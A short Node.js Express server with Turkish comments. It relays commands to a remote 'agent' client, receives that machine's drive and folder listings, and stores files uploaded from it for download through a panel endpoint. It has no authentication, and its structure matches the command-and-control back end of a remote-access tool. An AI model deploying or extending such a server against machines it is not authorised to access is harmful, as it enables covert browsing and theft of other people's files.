const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

let database = {
    fileList: [], // Hem klasörleri hem dosyaları tutacak
    currentPath: "Sürücüler", // O an hangi klasördeyiz?
    lastUpdate: "Veri yok",
    pendingCommand: "GET_DRIVES" // İlk açılışta sürücüleri iste
};

let tempFileStorage = { fileName: "", data: null };

// Agent (Client) buraya bağlanır
app.all('/agent', (req, res) => {
    if (req.method === 'POST') {
        database.fileList = req.body.files;
        database.currentPath = req.body.currentPath;
        database.lastUpdate = new Date().toLocaleString('tr-TR');
        console.log("Dizin güncellendi:", database.currentPath);
    }
    res.json({ command: database.pendingCommand });
});

// Panel veriyi buradan çeker
app.get('/panel', (req, res) => {
    res.json(database);
});

// Panel komut gönderir
app.post('/panel/command', (req, res) => {
    database.pendingCommand = req.body.command;
    res.json({ status: "OK" });
});

// Dosya yükleme ve indirme kapıları
app.post('/upload', (req, res) => {
    tempFileStorage = { fileName: req.body.fileName, data: req.body.data };
    database.pendingCommand = "IDLE";
    res.json({ status: "Uploaded" });
});

app.get('/download-file', (req, res) => {
    res.json(tempFileStorage.data ? tempFileStorage : { status: "No file" });
});

app.listen(PORT, () => console.log(`Server hazır: ${PORT}`));
